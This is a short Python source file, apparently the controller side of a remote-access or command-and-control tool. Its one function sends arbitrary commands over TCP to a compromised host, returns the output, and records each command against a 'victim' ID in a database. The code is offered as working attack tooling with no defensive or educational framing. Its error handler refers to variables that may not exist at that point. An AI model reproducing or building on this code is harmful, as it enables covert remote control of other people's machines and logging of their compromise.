import socket
from datetime import datetime
from database.connect.connect import *

def R_tcp(host, command, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        BUFFER_SIZE = 4096
        s.connect((host, port))
        s.send(command.encode())
        if command.lower() == "exit":
            return "Disconnected."
        results = s.recv(BUFFER_SIZE).decode()
        s.close()
        execution_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        victimid = get_victimid_by_ip(host)
        conn = connect_to_database()
        insert_log(conn, victimid, "Command", execution_time)
        insert_command(conn, victimid, command,"executed", execution_time )
        return results.strip()
    except Exception as e:
        insert_command(conn, victimid, command, "failed", execution_time )
        return f"Error when sending command: {e}" 
    
    